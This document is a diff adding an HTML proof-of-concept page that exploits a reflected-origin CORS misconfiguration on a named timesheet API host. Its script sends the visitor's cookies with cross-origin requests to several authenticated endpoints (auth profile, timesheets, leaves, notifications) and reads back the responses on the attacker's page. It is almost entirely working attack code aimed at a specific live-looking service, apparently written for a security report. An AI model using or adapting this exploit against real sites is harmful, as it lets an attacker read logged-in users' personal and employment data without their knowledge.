@@ -1,0 +1,42 @@
+<!doctype html>
+<html>
+  <head><meta charset="utf-8"><title>CCC timesheet-api CORS PoC</title>
+    <style>body{font-family:monospace;margin:24px}pre{white-space:pre-wrap;word-break:break-all}#out{color:#b00}</style>
+  </head>
+  <body>
+    <h3>CCC timesheet-api — Reflected-Origin CORS PoC</h3>
+    <p>Attacker origin: <b id="o"></b></p>
+    <p>Reading <code>https://ccc.net.sa/api/auth/me</code> cross-origin <b>with credentials</b>...</p>
+    <pre id="out">waiting...</pre>
+
+    <script>
+      const out = document.getElementById('out');
+      document.getElementById('o').textContent = location.origin;
+
+      // The server reflects our Origin in Access-Control-Allow-Origin
+      // AND sets Access-Control-Allow-Credentials: true, so the browser
+      // lets us READ the response of an authenticated request.
+      async function hit(path) {
+        try {
+          const r = await fetch('https://ccc.net.sa' + path, {
+            method: 'GET',
+            credentials: 'include',           // send the victim's cookies
+            headers: { 'Accept': 'application/json' }
+          });
+          const t = await r.text();
+          return path + ' -> HTTP ' + r.status + ' ACAO=' + r.headers.get('access-control-allow-origin') + '\n' + t + '\n';
+        } catch (e) {
+          return path + ' -> BLOCKED (' + e + ')\n';
+        }
+      }
+
+      (async () => {
+        let res = '';
+        for (const p of ['/api/auth/me', '/api/users/me', '/api/timesheets', '/api/dashboard', '/api/leaves', '/api/notifications']) {
+          res += await hit(p) + '\n';
+        }
+        out.textContent = res;
+      })();
+    </script>
+  </body>
+</html>
